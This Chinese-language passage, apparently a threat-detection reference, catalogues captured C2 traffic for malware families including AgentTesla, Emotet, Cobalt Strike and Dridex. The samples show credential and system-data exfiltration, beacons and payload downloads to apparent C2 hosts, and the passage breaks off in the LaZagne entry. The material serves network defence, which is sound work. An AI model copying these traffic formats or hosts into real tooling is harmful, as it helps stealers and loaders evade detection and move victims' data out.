前言：以下为几种常见的C2流量特征。

### AgentTesla

一个基于.NET的键盘记录器。记录击键和主机的剪贴板，它最终将这些记录的信息返回到C2。它具有一个模块化的基础结构。

流量特征如下

HTTP下

> POST /zin/WebPanel/api.php HTTP/1.1  
> User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)
> Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)  
> Content-Type: application/x-www-form-urlencoded  
> Host: megaplast.co.rs  
> Content-Length: 308  
> Expect: 100-continue  
> Connection: Keep-Alive
>
> HTTP/1.1 100 Continue
>
>
> p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH

FTP下

> <html>Time: 11/25/2019 17:48:57<br>User Name: admin<br>Computer Name:
> VICTIM-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Intel(R)
> Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61
> MB<br><hr>URL:https://www.facebook.com/<br>  
> Username:test@test.com<br>  
> Password:testpassword<br>  
> Application:Chrome<br>  
> <hr>  
> URL:192.168.1.1<br>  
> Username:test@test.com<br>  
> Password:testpassword<br>  
> Application:Outlook<br>  
> <hr>  
> </html>

SMTP下

> From: office@xxx.]com  
> To: officelogs@xxx[.]com  
> Date: 12 Oct 2019 17:58:19 +0100  
> Subject: admin/VICTIM-PC Recovered Cookies  
> Content-Type: multipart/mixed;  
> boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
>
> \----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7  
> Content-Type: text/html; charset=us-ascii  
> Content-Transfer-Encoding: quoted-printable
>
> Time: 10/12/2019 11:58:13<br>UserName: admin<br>ComputerName: VICTI=  
> M-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=  
> el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=  
> 5.183.107.236=0A<hr>

### Azorult

AZORult用于凭证和支付卡信息窃取。

流量特征如下

> POST /index.php HTTP/1.1  
> User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)  
> Host: 51.38.76.57  
> Content-Length: 103  
> Cache-Control: no-cache
>
>
> J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I

### Buer Loader

Buer是一种在地下论坛上销售的下装载机，被威胁者用来将有效载荷恶意软件传送到目标机器上。

流量特征如下

GET方式

> GET
> /api/update/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ODM0MjIwNTc5ZGIzNGJiMTMzNWNlMmJlNDJmMjBhMTA5MTVjNWQxZThmN2U0OWJjYjY0ODVjODE4NjQwYjk3YzY0NWU5NjAxNGMxY2U3NWQ2MmI5N2MwY2QzNzlhMmQ2ZmM5ZDFjZjIwNWMwMTEwNWVkNDAyZjY0ZDYyMTg0Y2UyZmJhZmEyYTQxMzBhZWRiNmY0ZjI2ZjFjZmI4MTQwMTBiYzE0Y2Y4NjBiM2U2NGE1NTBhNTc0Y2M4
>
> HTTP/1.1  
> Connection: Keep-Alive  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36  
> Host: loood1.top
>
> HTTP/1.1 200 OK  
> Server: nginx  
> Date: Tue, 12 Nov 2019 20:00:24 GMT  
> Content-Type: text/plain; charset=utf-8  
> Transfer-Encoding: chunked  
> Connection: keep-alive
>
>
> ODMtMkQtNzItMUMtMEQtOTgtREEtOTAtMzktNjUtREYtNzYtRDktQkYtQkYtNUEtMDUtNEMtRjAtRkMtMjAtQzctMEUtQzMtRDAtODYtMzYtRTQtOTktMDAtN0YtRDAtNjQtNDctMzktMkYtRTktMTMtM0MtNDgtNjktNTQtNDEtMTktRjMtNUUtQTItNjgtQTUtMjQtNkEtNEItNzItQ0UtODUtRDQtMDAtQjctMTYtNEItOUItMDQtQzgtMTctN0UtRDgtQzctMDAtM0ItN0ItQzUtQTQtMTYtQUEtM0UtNEEtRjMtRUItNDUtQTctMEItMTctOTEtNUItNTQtNEEtODUtNzctNEEtQjUtRTYtMUMtNTktRDEtODctNDQtQkItMjAtNkQtNTgtQzEtMEEtNEItNEMtRTEtNTItM0MtRTItMkYtNTktOEUtMkUtRjItRDgtRjQtOTgtMUYtRjEtNTEtQzktMTUtNTAtQkEtNDktMkUtMzAtRDMtMjUtRDMtODctNEItQjYtRjUtN0MtMUUtMjQtRTktOTgtM0MtNTYtNjYtRTUtRDctQ0UtMDAtNUQtNkEtODUtMDEtQjEtMkMtQjctODUtMkQtMzItNjItNUEtM0UtRUQtMTYtMDYtMjYtMDYtRDMtOTYtMDMtOUEtOTEtN0MtMTUtOTEtRkYtQUItMDItQzItNzctRTItN0EtNDEtMEEtQjAtMzItOUEtMEYtRjQtMDMtNzAtMUYtMEItNTEtMDktM0EtNzQtQjEtODgtMzEtMUQtREEtQTItRjQtMzktNkUtMTctRDItRDktNTQtRDUtOEYtMDAtQkEtODEtNkUtNEUtMzUtQTMtNTItRkQtODctRTMtRDYtMkMtNTQtODctQTItNjYtQzgtM0MtMzgtQzctMEEtM0EtOUQtOEEtMzAtRTAtMDgtMzItMTAtMDgtRjItQjYtRkUtMUQtQzctQzgtQUUtOEYtNjctQUUtNTItMDUtQTktMTAtQUYtM0MtOEUtMTMtN0EtNzItM0YtMzAtRTktMzUtRDMtNTQtQkEtOEQtQzAtMzItQTctRkItNDUtQTMtNTctRTQtMUItMzAtODItNEYtOTEtOTktMUMtRDItRjgtMkEtMzYtRTItODktQjItQkItMUItNjYtQUMtMUItOEMtNjQtRUEtN0QtQkQtMkMtOTktQ0QtQzQtQkQtNzgtQzgtOUMtQjAtNkQtNTYtOEUtRDktREEtOTEtMEEtNkMtQUEtQTQtMUUtRTAtQ0MtMzMtRDMtMjAtRTItNjktMjktQzEtRTQtNjEtMTAtMjUtOTgtNjMtOEUtNTgtNzQtRjctNUEtNEYtNDktQzUtNjItNTEtNTAtNTgtNDktM0QtREQtNjctRDctNjEtMTAtMTktRkItNzUtODYtRUItMEYtQzMtRDMtQkQtMjctNkUtQzYtRDktQkYtQUUtNDAtOEEtMUEtMUQtNjctOEMtMjItNjctQjgtNUQtQzItMTUtREQtODMtNzgtNjctN0ItMTMtNDktNzMtRjMtRTAtNEYtMDUtRkYtQjktQ0ItMkEtMDctQkMtRTgtRTMtREQtMUMtNEEtQUQtQjItMTUtNUEtNDMtMTQtQUEtNDEtMUQtNzAtMUEtREQtNTQtMTYtOTAtNjctMTUtNjUtQTgtMjItMTUtMzgtRDYtNjgtOTQtNDMtNDQtQzgtNkQtMUYtNTAtNkMtMTgtMzMtQjUtNzAtOTQtMDQtNzMtRDMtNjQtMTktNDctNjYtNzgtOTEtQkUtQ0ItRTktREItNkQtODgtRkMtOTAtOTk=GET
> /api/download/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ZGU0NjMDI5MWU2NGJhNTYyMDhiMGI4MDlhNDBkNGQ5NjQ2NWQxYjgzNzYwNmIzYjQxZTViZDU4MDE3YjQyZjZmNTVjNg==
>
> HTTP/1.1  
> Connection: Keep-Alive  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36  
> Host: loood1.top
>
> HTTP/1.1 200 OK  
> Server: nginx  
> Date: Tue, 12 Nov 2019 20:00:24 GMT  
> Content-Type: application/*  
> Content-Length: 2109952  
> Connection: keep-alive  
> Last-Modified: Tue, 12 Nov 2019 19:32:38 GM

POST方式

> POST / HTTP/1.1  
> Connection: Keep-Alive  
> Content-Type: application/x-www-form-urlencoded  
> User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en)
> AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3  
> Content-Length: 1046  
> Host: 162.244.81.87
>
>
> inekece=MDllNzB&diakwadi=iMzE5OG&xycyad=NiNTYxZTcw&ohxiods=MzA0Yj&akreuq=NmZjUy&qosewyic=MzRmMTk5M&amupawel=jdjZGViY&ydsohuu=jljNzMxZDc&orbemaaf=3ZDExMmEx&inhiadfa=ZjA3MG&kyzeafu=UyYzc0M2&alnaexu=M3NGZj&idsavu=Y2VjM2RhO&nyxyygre=GY3YmR&tuxynool=hMmU3Yzc1O&myweka=DNkMDAwYWF&qeozoszi=kOGRlZD&dygyliaz=diNmZkNW&ykdovy=ZiYmVhY&yvabqua=zA4NWEzN&ugsoetl=2Y3ZDk&wymioxi=xNzIwMTIy&uqafsee=Njg1ZTYwNG&cyyqsady=M3NmQwZj&ykuweddy=hkYTQ5ZTV&emlazebe=hYzc5MGVkZ&imirdaby=mJiMzU&doyvku=wYzRhNzQ&roniym=0YTQ5ZDBi&qyaxwe=MTlmZW&uteqop=NkZjdkN2Z&noylke=lNTg5OGJmM&dedynu=DEzNjgxM&suutyfwu=DBkMjFiYm&riitoked=M3NmJjMDg&waliaw=2ZjNhNW&qiubulo=EzZGU2Zm&urehuz=UxNzhjZj&guizpuat=kzYjMzMz&ziapluc=IzODIyYT&orygybib=Y2OGUwY&ebilxufo=2RmYzllM&wesekuy=DVlZThmYTQ&buapxa=3MGVmZDM&lisoxu=xNTlkZ&usgager=TBmOTZDY&cuehlumy=0ZTA5OTZlO&raxyuh=DE2MTA0YWN&piuluwyc=iYjQ4NjE0&gybetez=MzQ3ZW&isvazugo=NhZDExZGEz&obalozha=YmJjZDQ4&pivoewta=NzljOTI&dakiva=xMTE4ND&luzaih=A4OGEz&sesyaci=Mzk0ZWE1YT&opheteow=AxNjQwN&ebzyluo=zBkZWYy&osfiuk=ODc2&yzxaob=NDVmMTViNjdkZDli&exmuur=suirufy  
>  
>

### Cobalt Strike

Cobalt
Strike是一款付费渗透测试产品，它允许攻击者在受害者计算机上部署一个名为“Beacon”的代理。Beacon为攻击者提供了丰富的功能，包括但不限于命令执行、键盘记录、文件传输、SOCKS代理、权限升级、MimiKatz、端口扫描和横向移动。

流量特征如下

> GET /Mdt7 HTTP/1.1  
> User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
> Trident/5.0; NP06)  
> Host: 192.168.1.44  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
> HTTP/1.1 200 OK  
> Date: Wed, 16 Nov 2019 02:13:32 GMT  
> Content-Type: application/octet-stream  
> Content-Length: 213589
>
> .......  
>
> w.z....=..........C.D.'.'Z.2....:1....R..1...1.......1.9.t...^.......3.Q.3.R.~...~..........6a..6a-L^.............................................`.....W...?...O...=...^...1...T...:.......:..._...U...U...U.v.......v......,9  
> .W.E.3k..a....9..l.T..k...........J......;J.._.k...$......J....h...'..qD
>
> GET /push HTTP/1.1  
> Accept: */*  
> Cookie:
> TwJl1o2Nzk3+xmC39FsNTbyJPGHyNxllFZ8wZUwR831SYmTwrxoGydXQGF1ej89K1t0rTLgzjd95c8127hlZ6SQ4hx95YrYuRHooitXYGEAxtbKv53LJ6K+6r1y1OQU3n0+O93xxPiyx6RvPeKzlACbO4nEc5YKzh0vAfWJvlm0=  
> User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;
> BOIE9;ENXA)  
> Host: 192.168.1.44  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
> HTTP/1.1 200 OK  
> Date: Wed, 16 Nov 2019 02:017:31 GMT  
> Content-Type: application/octet-stream  
> Content-Length: 0

遵循AmazonC2配置

> GET /s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books HTTP/1.1  
> Host: www.amazon.com  
> Accept: */*  
> Cookie: skin=noskin;session-> token=MM4bZQ5WUPUrn7TPQuCWct6G+WGXZaLdezMQVEv8PHnB7tnvTk7ct3W71pQmn2NMJQD7IFbjPnKJV27tKshA8AjgzpXoeUtOIrDiBEg0x3AesYq52s74IbjnsVA+wASo0D6L23fd87XNDUiBro5wNBzcybUOADAO1fjCobw5MAw=csm-> hit=s-24KU11BB82RZSYGJ3BDK|1419899012996  
> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like
> Gecko  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
> HTTP/1.1 200 OK  
> Date: Fri, 13 Dec 2019 17:48:39 GMT  
> Server: Server  
> x-amz-id-1: THKUYEZKCKPGY5T42PZT  
> x-amz-id-2: a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=  
> X-Frame-Options: SAMEORIGIN  
> Content-Encoding: gzip  
> Content-Length: 0

遵循safebrowsing配置

> GET /safebrowsing/ref/eNKSXUTdWXGYAMHYg2df0Ev1wVrA7yp0T-WrSHSB53oha HTTP/1.1  
> Accept-Language: en-US  
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
> Accept-Encoding: gzip  
> Host: novote.azureedge.net  
> Cookie:
> PREF=ID=foemmgjicmcnhjlacgackacadbclcmnfoeaeeignjhiphdgidlmahkgbchcahclpfcadjnegckejpiofbmllpnaeancgbikcdjohkekapgnkgiijobnknkgiahmkcjipnncehcamnopcmlngcboppjdplhhobhgekdcblgpkdggeklenpcabdkhhhaedogkacljhdgdphfanfbmcbnkgjmplhdkomllhnnoppchchejooiplahpgpmfaegdcpbnd  
> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
> like Gecko) Chrome/55.0.2883.87 Safari/537.36  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
> HTTP/1.1 200 OK  
> Content-Encoding: gzip  
> Age: 1609  
> Alternate-Protocol: 80:quic  
> Cache-Control: public,max-age=172800  
> Content-Type: application/vnd.google.safebrowsing-chunk  
> Date: Fri, 22 Nov 2019 13:34:50 GMT  
> Server: ECAcc (frb/67BC)  
> X-Content-Type-Options: nosniff  
> X-Frame-Options: SAMEORIGIN  
> X-XSS-Protection: 1; mode=block  
> Content-Length: 82480

### Danabot

#### Danabot专注于持久化和窃取有用的信息，它的流量标志是在“24 01 00”下的24字节第一个数据包。

> 00000000 24 01 00 00 00 00 00 00 e5 7c 00 00 00 00 00 00 $....... .|......  
> 00000010 09 7e 00 00 00 00 00 00 .~......

### Darkcomet

DarkComet能够通过使用简单的图形用户界面来启用对系统的远程控制。

流量特征如下

>
> BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E32814BA1D830DF380472AFFBC7F034344A76764BFCC2D73B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F5823E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2A01B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0EEFA15FF93BDBE8D0E716D8C7E5F3

### Dridex loader

Dridex是一种规避、窃取信息的恶意软件变体；其目标是获取尽可能多的凭据，并通过加密隧道将它们返回到命令和控制服务器。流量特征如下

> GET /function.php?3b3988df-c05b-4fca-93cc-8f82af0e3d2b HTTP/1.1  
> Host: masteronare.com  
> Connection: Keep-Alive
>
> HTTP/1.1 200 OK  
> Server: nginx  
> Date: Tue, 05 Nov 2019 20:32:12 GMT  
> Content-Type: application/octet-stream  
> Content-Length: 455830  
> Connection: keep-alive  
> Keep-Alive: timeout=60  
> Accept-Ranges: bytes  
> Content-Disposition: attachment; filename=5dc1dcd884c.pdf
>
>
> 7Y2FGZnZ2enZ2dnZydnZ2dhgYD3Z2e1B2dnZ2dnZ2dnZmdnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnYPdnZ2dnYDUUJQA3ZDdll5flVQdWN6B19hcF9HVE51QFRaDllUWnFDfnB5X1VaAkFTdHVebWR1TlNgA1BWYANQZXIOY35wBkFtcGJCc2YHfH12dnZ2dnZ2dnZ1XxxRchx9bV5RVWRgblkFB1tafQ5DdlsAXlVjBW5ZBQd0b0FxQ3J9XlFVZn1SD1oFQ1p9DkMCR1F0VWRGblkFB1tafQJDX31eUVVmfVIAYAdcWn0OQ3ZbAFtVZGRuWQUHdG9CeUN9fV5RVWZ9UgIFB1xafQ5DYlpbXVZ0YG5ZBQd2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZicmJ2dnJAdXV2dXJRenFTdnZ2dnZ2dnZ2dnNQdnZ+X3RAcn52dnRAdkB2dlh9cn  
> POST / HTTP/1.1  
> Host: 194.99.22.193  
> Content-Length: 3442  
> Connection: Close  
> Cache-Control: no-cache
>
> ..5......[,h?])moo..;.Y..  
> v..jq..........G.0vR...@ ..6tw..<.{It.y  
> #l.K..8....v...v......=.+.......Q..v..P5...y...uhTqR.  
> ..v.QoM..o.I.l...>.....p.....Rt...............

### Emotet

Emote在历史上是一种在僵尸网络中组织起来的银行恶意软件。流量特征如下

> POST /mult/tlb/ HTTP/1.1  
> Referer: http://69.162.169.173/mult/tlb/  
> Content-Type: application/x-www-form-urlencoded  
> DNT: 1  
> User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;
> Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR
> 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)  
> Host: 69.162.169.173:8080  
> Content-Length: 468  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
>
> 5Grps=L1sIwg4a7XWGwPpN9LOBzMiBXsZTP33ixo%2FUspmgBLoaYr0K7KnwvoUER9%2B5NzIxpTHgpSTeVRZMm92wSA%2Ff9pG66uhR%2FX%2BGREn%2BVIvlr3LiYQupDVsdexmgD%2FSXdTJ%2FxXNSo5Q52S4HvI9eLtM9s0arCw%2FNNEZlkzp6e8omxU3854YNNNUcAV54N30rgISrXlxvWJz9TP%2FelEcMxMf3hzv91K1Uz8H2KWzWjV2x78pmAG9HGdkFGLaOq6Tqp1LH6Uc7c1gzmZ3Cht2T4cKg06DPDTHkXYj%2F7uCMWAFMO%2FS4QlZl1XKi8MmZck0JAmxsZdGcmIkQoqq5DzFCio6fUAgvqUN3g1%2BP5eXYeZpGu1xIzbWLRG9Wtt2vUOjz4ezl6Z%2B2peN1LKWN%2F8V0CLjxQHhXSu9YZP4g3NIdJ5qofLmM0ipT
>
> HTTP/1.1 200 OK  
> Server: nginx  
> Date: Mon, 07 Oct 2019 13:38:33 GMT  
> Content-Type: text/html; charset=UTF-8  
> Content-Length: 148  
> Connection: keep-alive
>
> .^ta.I..Z
> .._AJ*..=._...5-...F.L{>...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\\.j?/C......{pi.b....Cz......>D..yQ........G.q...4?..
>
>  
>

### Formbook

Formbook在受害者的计算机上部署自己时，会执行许多操作来躲避AV供应商。流量特征如下

> POST /k9m/ HTTP/1.1  
> Host: www.liuhe127.com  
> Connection: close  
> Content-Length: 3769  
> Cache-Control: no-cache  
> Origin: http://www.liuhe127.com  
> User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
> SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media
> Center PC 6.0; .NET4.0C; .NET4.0E)  
> Content-Type: application/x-www-form-urlencoded  
> Accept: */*  
> Referer: http://www.liuhe127.com/k9m/  
> Accept-Language: en-US  
> Accept-Encoding: gzip, deflate
>
>
> Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D2fNVsLRL8o7GMMvu8SY6wR8pwXAraJm4TKmuw5(TglqswaX2VpD_gJ3yal4FZ1pkDvEP81iuj_l_mMoqsdCGaFMxmu8LQC1CZjkxIXbFtlEaQg0Wfzvxpk9XRS39rZxxdqjALdRL8_N2LHRzPN35WuoIIn2J0mUB7u7x~42TwXHpZcLTJ4cELO23a_seXaFdgz~QWrxi7L3N9oGrwrY4tSxRUCsHQCoAB8CsxlUDIkY67TYTnYPmJxKxE06yA9NA5buPXUU-> rDGiNGDQ25(b371m2NNnyheUxDNxyL6wr0syvlQ7Qn~DvzJO1j4_01FUfdeQKDmT9nuRD7AXJYaO3DIZnG1RWkvBxF0H38hB8-R7b1kP1IZqlFNLuC1ttRMUWPoRYyiYb-5rzJXywgOQncCVwVXcwH8dkVBf8nIw1doGRbV0yBZciG1vmCQMiyqspdkDVZt-1KyQhCCDaZWgyx(jUEtrJ5ZzRRfL7eaLGAG1u46ihMFAoJdDXorJcFL051WdJ2wHBfyMv2c9wu1j78lVpEWNkON2Qnw-8VOoQrg4ItHWjdsmkjCk(8A-d-> uwY70GE0UXkWhPpg~_8qCqj_XNsXD1Cku4u0im9ibvYCLeQyYDn_FmL-U7ZNtOIbYeTHchiTz3fwdILdormZDVBuDzJlRACku5YKuqCIZoTnxUBI(iGkeX0da3GEkWCi8MA6nuA390kyWjwjSpzGHFYPG0B41C5bU5KrJx(9qiFYNfQPZqv5KDyJL8tN7jrqIny7WzTVRqvRHCeerIFPL5vosxC_3QvH2AlElM8Ssx(QZqz22ySsvMzyq8Hv~3tMLtg8mgzByn2dH2WrNAM3nk~XXu(6GurJtah4M9tPmohFGPLZxX5e3WCJ~h16eNNM4OaV~MOGVYusVrPgqFUS6P7iizTBZS(MsulNfuAKYvUq2kUMtCYSZAt34TUY6bJ5BTPy~4ydE8n16XohSRP8VbqhLAZ4DGO2n-hfrK2o9oUsNUWcpZyKA2(9kXBftM3s5lzWT21wBKbcPaiPURUuV4eheOkTBTxTB_mMxCafVVE6yvbJD-> XIpSazCu(sS7~QUEbh6EPrqsB11rhKlRPy39G2rLo6lSMHeGjCmI5Rc80lhtZyFKcqhNYbhwuiEn3uK9CodgYxVie6yY1MwI(M8VSBZ-> zQjldjXnFN~7oKDW3JglzgbK3lzeDK5aRb0HTwohxi8M9lRkTKflhtcr77iOlBVcE6HYSbchngmsBWBgPwA75xvzJhUUtgjJlxLW~bSPMG7x7GLVfCZjxxrjki0R9ZPDVdx71eP4yoIdymwRgqddVSuGCAIf641vyoItI9QzfvvuZBdpRQi3ZEw7LUifYAyjYZ2Xd9KdOMiNiLLeLsDCgWib~5r8iSfExWtFjsEgOt(2W_0JQSAgplkqJxkO9YxSdB9xsPfeavxYirf7azw7UGnDTEMQUnMMECFM5_v29oh6tKvIolHPv_qZrW0nGwd0aCMfzUqcV0(NlfiEQOxVZTonlWkJoR3hyyZQ~dKGW9j_WbA-8s54GvC-> VC~skS2jG4haG9bxKA6QZqRK4-2qI5o2U3rNoeQEz_~yMfZ2fQoftvSkgpJfcgjuh3qTOFK8b6OSe5wMnyLdniF_4xN3rO(73lGUB5l60LbBa4TAYc(Qn7pyfvhlhMx8nr0vm6kCom1xi-> VN1M(fSDqNubOVR_8QORONDFaX41G3HYOrWQyQ5Cvd6lAFgWycF3KeaumEH0LEUP7vR3t8CqgQ5VqyDxtKNy0Z7MVbqsq6s8~aYdnUL5DxSG9pbe8LW4uDqLcBuZ2WiDWmdiRx0cbf9-s0qx6mSwAo(Wz67SmWp2X8VI3W4h3M3vf9BggKJQmHp7nLChKFWJWTuEGt43fxqjimz5WaRYtGOcdlH84XYvX9kEB1(Fp99P6VKHhrkuCOrtiirAvl7KvjXYhsiOn20cjKKUL6l8(aZofg6g(CqTpB5dDGN86Korg1L6advz28Cc9QidH5ZPIAHrWXi9nG5FtnBxG-3R2N(J6V~IGsC8NZIwv0qB~35YLhS9SlyD38(p(pgy9N3fPHO9Gzlzd6D3j74fN-N89jhcQTClusyQIhdjrYsqWnpi7Of2Hl9zRx(ut-> kFP33A5zYLbDn54f9gg8kH1m(BeKfVXxVtpGLR4VQSBfZzVwPGnUei9aJDZkXwmg0xftRV~S3TxUucpU1d75Pa9NCvgMU51f7uv0XtF1S-0_nqUy(apdab1FJcSzLOVDXJDyOKr5P4px5QpKM1FZgH9mgQQZuo~rlcBi4jISUNx3qv7fwaBZ4KDYuICC1-KLeFh0i7YEU_njjPm31uzkYLlVxfbhAg6C7Fxcpr5_jzhW~me85m48ifV4C06qNAN5WgIGxJW07CUNAuLx2d4tZI85EWgoxQa3AOuINyalNllQZt2LBB~ReVqa8Gr3pLpZOSiDREVqDaruTFqNwAZndKWZ~CTIV4ss6txpH7ypXw3AZ4fiDn5j7NDtaJzXbptIpWgrv9yK(zab71BYxnEuPpsdZSnA2QWY9s300CraaT3RPj(gdt~5OjaG22qma1M9LYzgvBdIBH57aizchPopkjnWiJAuvabKSvJyEtKb5Ni67H1WbOnOKM8pMcqsaIBi1AfQV0PbikKmG-> HikPS86JBnJXZs8BWrbgm7g8uGrVpnnuHbHuP4p4xAOgYNPDbnpSoXn0kH~vUc1JxLurnAnNWMmYgA5g3fIw7HGvJSnKn6DDHod7HUKWF3ggfFJdZbucZxbJ2fpE64O6nKFy9It-R0BRZqcunVVvWy4zwCQ_1brWO78sSQY3WY4Es8kI6nl5hc9k3dhAWgQJWeqVrUGnOyxnf3wP9Tjc3fbhhfMthKeTVJEn485mDsUhxaOlIUrAoNDk1Kmua8F3zzcHpo~ixmjApivEsgkkIIni~mHnw4sce0IaJmWT9Ka_FCRQTC3dNAkBJHjcfTsYpgDvJBeZI8V7tnXTcJwQShoQoTdzOUvebgdia2s6HyC8Ay3lybE0Kvi4Ufu2qeJDnpSdiZAi8Ba-> AzxnhL~66T~sQU0SY1ZDTJsdMD9zA8h5A0g71lMEIFSEdczwnvBeXpuEiaX9FOoJQwoIyyq4KmaeML~f5ipBL5MgqKf36tQ4N9jiM0IMAZdarP~ZkdSRs6dnJ7bU4FFMvQUrM0EGSJMQfLAvB7d_c0IwGUl44oifYX7n8cNJQcRPEFt1PZYPKE47I_JQ2CSVE9Scfi6hmF2mrjjozj0NQFcK5B~W~c3GpQxJ8e9cNoWhrkZNK1CyKcuTjHkfWA5Bzoi5p5mrTFsA12M25Ubt5SuEd-> grtNyFbdev6Uyoislno4UJ9J6-8ag6iZXJd_QI17cAFS4P71bi7ApOh50qN4cNMIQBUTQyriS5BG~os6RMAuoaSUq92eNx12764W~RIGssW6ItGJFcg09D9nPLTs9jUhkhVwPicIhcak5ZLrkASapi44847mp8bI7hAIINPrZaKEyXejiDm5OUm7UVGno15_(251Jq3-Aic6sgovlTvlWBTFSkikUCmSMDX96nLlTuNiC2BD42WLJfGoZQw4T341YKl3rFShZ24mtmUGThk-k1OxGK1ygo5wLOg_H_Bs9MfxPn3aoIQiBq(XC7l4Xzw2LREItIvFPQXoWU(dxz3g)..

### IcedID

IcedID有一个模块化的恶意代码，具有现代银行木马程序的功能，类似于eus特洛伊木马的恶意软件。流量特征如下。

> GET /photo.png?id=0181B9BACBCF3080870000000000FF40000001 HTTP/1.1  
> Connection: Keep-Alive  
> Host: eurobable.com
>
> HTTP/1.1 200 OK  
> Server: openresty  
> Date: Wed, 16 Oct 2019 15:30:33 GMT  
> Content-Type: application/octet-stream  
> Content-Length: 605211  
> Connection: keep-alive  
> Last-Modified: Tue, 08 Oct 2019 11:43:19 GMT  
> ETag: "5d9c7657-93c1b"  
> Accept-Ranges: bytes
>
> .PNG  
> .  
> ...  
> IHDR..............N.T....sRGB.........gAMA......a.... pHYs..........o.d.
> ;.IDATOLrEV.....Le.D|...Rp.{..D...g`...a@.\8,E  
> .~1Z..X.N...^G.....,f$.c.......ru.#O..'.~.

### LaZagne

LaZagne为一个开源项目，用于检索存储在本地计算机上的大量密码。流量特征如下。

> POST /te.php HTTP/1.1  
> Content-Type: multipart/form-data;
> boundary=---------------------------58748130728276  
> User-Agent: Mozilla/5.0 Gecko/20100115 Firefox/3.6  
> Host: 192.168.1.44  
